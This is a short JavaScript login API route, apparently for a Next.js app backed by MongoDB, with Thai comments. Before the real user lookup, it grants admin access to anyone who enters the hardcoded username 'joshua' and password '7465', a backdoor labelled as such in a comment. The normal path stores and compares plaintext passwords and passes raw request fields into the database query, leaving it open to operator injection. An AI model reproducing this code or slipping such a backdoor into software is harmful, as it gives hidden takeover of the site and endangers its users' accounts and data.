import dbConnect from '../../../lib/mongodb';
import User from '../../../models/User';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  await dbConnect();
  const { username, password } = req.body;

  // 👑 Joshua Backdoor ระบบจำรหัสผ่านพิเศษ
  if (username === 'joshua' && password === '7465') {
    return res.status(200).json({
      success: true,
      user: { username: 'joshua', role: 'admin' }
    });
  }

  // ระบบเช็ค User ปกติในฐานข้อมูล
  const user = await User.findOne({ username, password });
  if (user) {
    return res.status(200).json({ success: true, user });
  }

  res.status(401).json({ success: false, message: 'ชื่อผู้ใช้หรือรหัสผ่านผิด' });
}